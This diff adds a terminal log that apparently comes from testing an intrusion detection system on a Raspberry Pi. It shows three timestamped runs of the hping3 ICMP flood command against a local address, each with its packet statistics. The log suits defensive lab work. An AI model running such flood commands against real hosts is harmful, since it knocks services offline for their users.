@@ -1,0 +1,36 @@
+┌──(kali㉿kali)-[~/RASPBERRYPI-IDS-NAJNOWSZY/ICMP_FLOOD]
+└─$ sudo ./timestamp.sh sudo hping3 --icmp --flood 192.168.0.100
+[sudo] password for kali: 
+Timestamp START: 03/20-02:37:54.719124502
+HPING 192.168.0.100 (eth0 192.168.0.100): icmp mode set, 28 headers + 0 data bytes
+hping in flood mode, no replies will be shown
+^C
+--- 192.168.0.100 hping statistic ---
+1558980 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+Timestamp END: 03/20-02:38:13.630837206
+                                                                                                                                
+┌──(kali㉿kali)-[~/RASPBERRYPI-IDS-NAJNOWSZY/ICMP_FLOOD]
+└─$ sudo ./timestamp.sh sudo hping3 --icmp --flood 192.168.0.100
+Timestamp START: 03/20-02:39:15.195884697
+HPING 192.168.0.100 (eth0 192.168.0.100): icmp mode set, 28 headers + 0 data bytes
+hping in flood mode, no replies will be shown
+^C
+--- 192.168.0.100 hping statistic ---
+640861 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+Timestamp END: 03/20-02:39:22.286952321
+                                                                                                                                
+┌──(kali㉿kali)-[~/RASPBERRYPI-IDS-NAJNOWSZY/ICMP_FLOOD]
+└─$ sudo ./timestamp.sh sudo hping3 --icmp --flood 192.168.0.100
+Timestamp START: 03/20-02:40:59.723190086
+HPING 192.168.0.100 (eth0 192.168.0.100): icmp mode set, 28 headers + 0 data bytes
+hping in flood mode, no replies will be shown
+^C
+--- 192.168.0.100 hping statistic ---
+843930 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+Timestamp END: 03/20-02:41:08.206826334
+                                                                                                                                
+┌──(kali㉿kali)-[~/RASPBERRYPI-IDS-NAJNOWSZY/ICMP_FLOOD]
+└─$ 
